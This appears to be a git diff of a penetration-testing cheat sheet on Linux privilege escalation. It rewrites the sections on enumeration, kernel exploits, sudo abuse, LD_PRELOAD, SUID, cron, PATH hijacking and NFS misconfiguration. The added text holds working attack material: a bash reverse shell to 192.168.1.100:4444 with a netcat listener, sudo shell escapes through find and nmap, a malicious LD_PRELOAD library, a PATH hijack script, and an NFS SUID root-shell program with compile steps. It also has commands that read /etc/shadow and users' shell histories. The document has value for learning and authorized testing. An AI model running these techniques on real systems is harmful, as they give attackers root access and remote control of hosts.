@@ -1169,119 +1169,162 @@ The first step of this exploitation is exploring it's abuse vectors, covered by 
 
 #### Enumeration
 
-Consists of examaning the system with all available options we have as the user we currently have access to.
+Enumeration is the systematic process of collecting detailed information about a target system using the level of access currently available. The objective is to understand the system’s configuration, operating environment, users, processes, services, network settings, and security controls in order to identify potential weaknesses or escalation paths. Unlike initial discovery, enumeration focuses on extracting maximum insight from existing access rather than attempting new intrusions.
+
+---
 
 <ins>Linux</ins>
 
-List of useful Linux commands:
+- `default`: manual local enumeration commands executed on a Linux system to gather system, user, process, file, and network information available to the current user context.
 
 ```shell
-# Get name of the machine
+# System identification
 hostname
+uname -a                  # Kernel and system architecture information
+cat /proc/version         # Detailed kernel version information
+cat /etc/issue            # Distribution and OS information
 
-uname -a -> Information on the running system
-/proc/version -> Kernel information
-ps -> Process information
-ps -A -> All processes
-ps axjf -> Process tree
-/etc/issue -> System information
-env -> Enviromental variables
-sudo -l -> List of commands current user can run as sudo
-ls -la -> List all files even hidden
-id <user> -> Information on users
-/etc/passwd -> Information on users
-history -> List of recent commands
-ifconfig -> Network interface info
-ip route -> Network routes
-netstat -> Network communication info
-netstat -a (open ports)
-netstat -at (tcp) | -au (udp)
-netstat -l (listening)
-netstat -s (statistics)
-netstat -tp (service info)
-find -> filter directories and find depending on args
-grep -> filter input
+# Process enumeration
+ps                        # Processes for current terminal
+ps -A                     # All running processes
+ps axjf                   # Process tree with hierarchy
 
-# Files with SUID or SGID set
-find / -type f -perm -04000 -ls 2>/dev/null
+# Environment and user context
+env                       # Environment variables
+id                        # Current user and group IDs
+id user                   # Information about a specific user
+history                   # Command history for the current session
+cat /home/user/.bash_history  # Persistent command history (if accessible)
 
-# Files with capabilities
-getcap -r / 2>/dev/null
+# User and account information
+cat /etc/passwd           # Local user accounts
 
-# See cron jobs schedule
-/etc/crontab
+# File system inspection
+ls -la                    # List all files, including hidden ones
 
-# See writable folders
+# Privilege and sudo configuration
+sudo -l                   # Commands the current user can run with sudo
+
+# Network enumeration
+ifconfig                  # Network interfaces (legacy)
+ip route                  # Routing table
+netstat                   # Network connections and statistics
+netstat -a                # All connections and listening ports
+netstat -at               # TCP connections
+netstat -au               # UDP connections
+netstat -l                # Listening services
+netstat -s                # Network statistics
+netstat -tp               # Process and service associations
+
+# File and permission discovery
+find / -type f -perm -04000 -ls 2>/dev/null   # Files with SUID/SGID set
+getcap -r / 2>/dev/null                       # Files with Linux capabilities
 find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+                                              # Writable directories
 
-# See NFS configuration
-cat /etc/exports
-showmount -e {VICTIM_ADDRESS}
+# Scheduled tasks
+cat /etc/crontab            # System-wide cron jobs
+crontab -l                  # List cron jobs for the current user
+crontab -u root -l          # List cron jobs for another user (if permitted)
 
-# See permitted sudo commands for user
-sudo -l
+# NFS configuration
+cat /etc/exports            # Exported NFS shares
+showmount -e victim_ip      # Enumerate remote NFS exports
 
-# History of commands on user
-cat /home/{user}/.bash_history
+# Command filtering utilities (used during enumeration)
+find                        # Search files and directories
+grep                        # Filter and match patterns in output
 ```
 
-List of useful third-party tools:
+- `LinPEAS`: is a comprehensive Linux privilege‑escalation enumeration script that performs extensive system checks, highlighting potential escalation vectors using color‑coded and categorized output. It is part of the PEASS (Privilege Escalation Awesome Scripts Suite) project and is widely used in penetration testing and CTF environments.
 
-- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-- LinEnum: https://github.com/rebootuser/LinEnum
-- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-- Linux Priv Checker: https://github.com/linted/linuxprivchecker
+```bash
+# Get the enumeration tool
+git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+```
 
-Enumeration once accessed
+- `LinEnum`: is a lightweight Linux enumeration script that focuses on identifying common privilege‑escalation misconfigurations such as weak file permissions, vulnerable kernel versions, cron jobs, and sudo rules. It is often used for quick initial assessments.
 
-Tools
+```bash
+# Get the enumeration tool
+git clone https://github.com/rebootuser/LinEnum
+```
 
-- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-- LinEnum: https://github.com/rebootuser/LinEnum
-- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-- Linux Priv Checker: https://github.com/linted/linuxprivchecker
+- `LES (Linux Exploit Suggester)`: is a kernel‑focused enumeration tool that analyzes the running kernel version and suggests known local privilege‑escalation exploits based on publicly disclosed vulnerabilities.
 
-<ins>Windows</ins>
+```bash
+# Get the enumeration tool
+git clone https://github.com/mzet-/linux-exploit-suggester
+```
 
+- `Linux Smart Enumeration (LSE)`: is a structured and modular enumeration script that categorizes findings by severity and relevance. It emphasizes clarity and signal‑to‑noise reduction, making it suitable for professional assessments.
+
+```bash
+# Get the enumeration tool
+git clone https://github.com/diego-treitos/linux-smart-enumeration
+```
+
+- `Linux Priv Checker`: is a legacy privilege‑escalation enumeration script that checks for insecure configurations, sensitive files, and weak permissions. While less actively maintained, it remains useful for older systems.
+
+```bash
+# Get the enumeration tool
+git clone https://github.com/linted/linuxprivchecker
+```
 
 #### Kernel Exploits
 
-One of the ways of escalating privileges is abusing the kernel version currently in use in the attack machine. This kernel version might have already written exploits that help us escalate privileges.
+Kernel exploitation is a privilege‑escalation technique that targets vulnerabilities in the operating system kernel. Since the kernel operates at the highest privilege level, successful exploitation typically results in full administrative (root) access. Systems running outdated, unpatched, or misconfigured kernels are particularly susceptible to this class of attacks, as publicly disclosed vulnerabilities often have corresponding proof‑of‑concept or weaponized exploits available.
 
-To looks for these exploits we can use:
+---
 
-- exploitDb
-- searchsploit
+- `Exploit Database (Exploit‑DB)`: is a public archive of exploits and proof‑of‑concept code covering a wide range of platforms, including Linux kernel vulnerabilities. It provides detailed exploit descriptions, references, and affected versions.
+
+- `searchsploit`: is a command‑line utility that allows offline searching of the Exploit‑DB repository. It enables rapid identification of kernel exploits based on version numbers, distribution names, and vulnerability identifiers.
+
+```
+# Identify the running kernel version
+uname -a
+uname -r
+
+# Search for Linux kernel exploits using searchsploit
+searchsploit linux kernel 4.4
+
+# Narrow the search to privilege escalation exploits
+searchsploit linux kernel 4.4 privilege escalation
+
+# Copy an exploit from Exploit-DB locally for review
+searchsploit -m linux/local/12345.c
+```
 
 #### Sudo Exploits
 
-Even though using sudo is pretty limited, sometimes some low lever users have access to a set of restricted privileged commands using sudo.
+Sudo‑based privilege escalation exploits arise from misconfigured sudo permissions that allow non‑privileged users to execute specific commands with elevated privileges. While sudo is designed to restrict administrative access, certain binaries can be abused to escape their intended functionality and execute arbitrary commands or access sensitive files. These weaknesses are typically the result of allowing powerful utilities to run as root without adequate restriction.
 
-Some of these applications might unwillingly allow us to do things we are not supposed to.
+Exploitation of sudo misconfigurations focuses on identifying binaries that permit command execution, file reading or writing, shell escapes, or environment manipulation. Enumeration of sudo permissions is therefore a critical step in post‑exploitation, as even a single allowed command can be sufficient to gain full root access. Public resources such as [GTFOBins](https://gtfobins.github.io/) document known sudo‑abusable binaries and common escalation techniques.
 
-For example, Apache2:
+---
 
-```
-apache2 -f /etc/shadow -> will show us the first line of etc/shadow after failing.
-```
+- `sudo`: is a privilege delegation mechanism that allows permitted users to execute predefined commands with elevated privileges. When improperly restricted, sudo‑allowed binaries may be abused to escalate privileges.
 
-Patrical examples:
+```bash
+# Apache example: forcing an error to leak file contents
+apache2 -f /etc/shadow
 
-```
-# Using find
-sudo find \ -type f -name "sh" -exec {} \;
+# Escalation using find (spawns a shell if permitted via sudo)
+sudo find / -type f -name "sh" -exec /bin/sh \;
 
-# Using nmap
+# Escalation using nmap interactive mode (legacy versions)
 sudo nmap --interactive
+# Inside nmap prompt:
+!sh
 ```
 
-LD_PRELOAD
+- `LD_PRELOAD`: is a dynamic linker environment variable that forces the loading of user‑supplied shared libraries before all others, which can be abused for privilege escalation when preserved in sudo environments.
 
-If a user has this permission `env_keep+=LD_PRELOAD`, this allows for custom libraries to be loaded before the sudo privileged program is executed using the LD_PRELOAD option.
-
-Here is an exploit in c using this:
+```bash
+# In sudo -l information
+env_keep+=LD_PRELOAD
+```
 
 ```C
 #include <stdio.h>
@@ -1296,80 +1339,92 @@ void _init() {
 }
 ```
 
-```
-# Compile as a library
+```bash
+# Compile the malicious shared library
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
-# Execute the exploit
-sudo LD_PRELOAD=/home/user/ldpreload/shell.so <privilege cmd>
+# Execute a permitted sudo command with LD_PRELOAD
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 
 #### SUID Exploits
 
-Sometimes in some systems, there are files with SUID owned by root. These files allow their execution with root privileges by any user. If a vulnerable file is SUID, it could be used to exploit an escalate our privileges allowing us to do whatever we want.
+Set User ID (SUID) is a special permission in Unix‑like operating systems that allows a binary to execute with the privileges of its owner rather than the privileges of the user executing it. When a file owned by the root user has the SUID bit set, any user who runs that file temporarily gains root‑level privileges for the duration of the program’s execution. This mechanism is intended to allow controlled access to privileged operations; however, it introduces significant risk when applied to unsafe or overly powerful binaries.
 
-Examples are files that allow us to run arbitary code, or that allow us to manipulate restricted files.
+SUID‑based privilege escalation occurs when a SUID binary can be abused to execute arbitrary commands, spawn a shell, or manipulate sensitive files. Because the binary runs with root privileges, successful abuse typically results in full system compromise. This class of vulnerability is configuration‑based and remains exploitable regardless of kernel patch level if insecure SUID binaries are present.
 
-Binaries known to be exploitable: https://gtfobins.github.io/
+Well‑known SUID‑abusable binaries and techniques are documented in: https://gtfobins.github.io/
 
 #### Capabilities Exploits
 
-Just like SUID, capabilities allow users to get certain privileged permissions when executing commands. Unlike SUID, these permissions are more fine-grained and related to specific actions rather than the general executing a program as root.
+Linux capabilities provide a more granular privilege model than SUID by dividing root privileges into discrete units (e.g., file access, network administration, process control). Instead of granting full root access, a binary may be assigned only the specific capabilities required for its function. This model is designed to reduce the attack surface associated with privileged execution.
 
-If not properly set they could still be exploited to read unauthorized files or even gain root privileges.
+Capabilities‑based privilege escalation occurs when a binary is assigned excessive or inappropriate capabilities. If such a binary allows user‑controlled input, command execution, or file manipulation, the assigned capability can be leveraged to read restricted files, modify system state, or escalate to full root privileges. Although more fine‑grained than SUID, misconfigured capabilities can be equally dangerous.
 
-Binaries known to be exploitable with capabilites also: https://gtfobins.github.io/
+As with SUID, binaries known to be exploitable through misconfigured capabilities are cataloged in: https://gtfobins.github.io/
 
 #### Cron Jobs Exploits
 
-Cron jobs are scripts that are scheduled in a system to run from time to time. They normally run associated to the user who created them which means there will be scripts probably ran by root.
+Cron jobs are scheduled tasks in Unix‑like operating systems that execute commands or scripts automatically at predefined intervals. Each cron job runs with the privileges of the user who owns it, which commonly includes the root user for system‑level maintenance tasks. As a result, misconfigured cron jobs represent a frequent and effective local privilege‑escalation vector.
 
-If the ran scripts are not properly permission protected or are not defined by a full path, they could be edited to run arbitary code, or the PATH variable could be changed to redirect the script to a PATH where the user has write permission. (MORE ON PATH IN THE NEXT SECTION).
+Cron‑based privilege escalation occurs when scheduled scripts or commands are insecurely configured. Common weaknesses include writable script files, writable directories in the execution path, or the use of relative paths instead of absolute paths. In such cases, an unprivileged user may be able to modify the executed script, replace it with a malicious one, or manipulate the PATH environment variable so that a different executable is run when the cron job executes. When the cron job runs as root, this typically results in full system compromise.
 
-Here is a reverse shell script that could be used for cron jobs:
+---
+
+- `reverse_shell`: is a payload or technique that causes a compromised host to initiate an outbound connection to an attacker-controlled system, providing interactive command execution.
 
 ```shell
 #!/bin/bash
-
-bash -i >& /dev/tcp/{attacker-address}/{port} 0>&1
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 ```
 
-```
-# Attacker machine
-nc -nlvp {port}
+```bash
+# Attacker machine listener
+nc -nlvp 4444
 ```
 
 #### PATH Exploits
 
-If a command is called without its full path specification, linux will look for it under the folders in the $PATH enviroment variable.
+PATH hijacking is a privilege‑escalation technique that abuses how Unix‑like systems resolve executable names. When a command is executed without an absolute path, the operating system searches for the executable in the directories listed in the $PATH environment variable, in order of precedence. If a malicious executable with the same name exists earlier in the search path, it will be executed instead of the intended binary.
 
-If a SUID program calls for a "test" program without specification of the full path, we could manipulate the $PATH variable to look first in a malicious directory for `test` cmd.
+This technique becomes particularly dangerous when applied to privileged programs, such as SUID binaries or root‑owned scripts, that invoke external commands without specifying their full paths. By manipulating the $PATH variable, an unprivileged user can cause the privileged program to execute attacker‑controlled code, potentially resulting in full privilege escalation.
 
-In this directory we would have a `test` script that would run a shell.
+---
 
-Here is how we would do:
+- `PATH hijacking`: is a privilege‑escalation method that exploits improper command path resolution by redirecting execution to a malicious binary placed earlier in the $PATH.
 
-```
-# Add a directory to priority in PATH
+```bash
+# Prepend a writable directory to the PATH variable
 export PATH=/tmp:$PATH
 
-# Create malicious script
-echo "/bin/bash" > test (in tmp directory)
+# Create a malicious replacement for the expected command
+# This file must match the name of the command called by the vulnerable program
+echo "/bin/bash" > /tmp/test
+chmod +x /tmp/test
 ```
 
 ### NFS Exploits
 
-Sometimes gaining privilege escalation is not only about the local machine. We could for example find a SSH private key for root user and just SSH as the root user.
+Privilege escalation is not always limited to exploiting the local system configuration. In many scenarios, elevated access can be obtained by abusing credentials, trust relationships, or network services that allow authenticated or privileged access from another context. Examples include the discovery of private SSH keys, reusable credentials, or misconfigured network file‑sharing services.
 
-NFS (Network File Sharing) allows for files to be shared across devices. If the target is misconfigured (no_root_squash), which will make files be created by the owner of the directory (root if the case), NFS could allow for files to be written in this folders with root privileges and SUID, allowing for privilege escalation.
+Network File System (NFS) enables directories to be shared across multiple hosts over a network. NFS misconfigurations can introduce severe privilege‑escalation risks, particularly when the no_root_squash option is enabled. This option disables the usual mapping of root users to an unprivileged account, allowing files created on the share to retain root ownership.
 
-```
-# Mount NFS on attacker
-mount -o rw {address}:{path} {path/in/attacker}
+When an NFS share exported with no_root_squash is writable, an attacker can mount the share, create a malicious executable, assign it the SUID bit, and then execute it locally on the target system to gain root privileges.
+
+---
+
+- `NFS privilege escalation`: is a technique that abuses misconfigured NFS exports to create root‑owned SUID binaries, leading to full system compromise.
+
+```bash
+# Mount a writable NFS share on the attacker machine
+mount -o rw 192.168.1.50:/exports/home /mnt/nfs
 ```
 
-Build privilege escalation exploit
-```
+```c
+// Privilege escalation code in C
+#include <unistd.h>
+#include <stdlib.h>
+
 int main() {
     setgid(0);
     setuid(0);
@@ -1378,10 +1433,10 @@ int main() {
 }
 ```
 
-Compile it and give it SUID
-```
-# In the mounted folder
+```bash
+# Compile the exploit inside the mounted NFS directory
 gcc exploit.c -o exploit -w
 
+# Assign the SUID bit to the binary
 chmod +s exploit
 ```
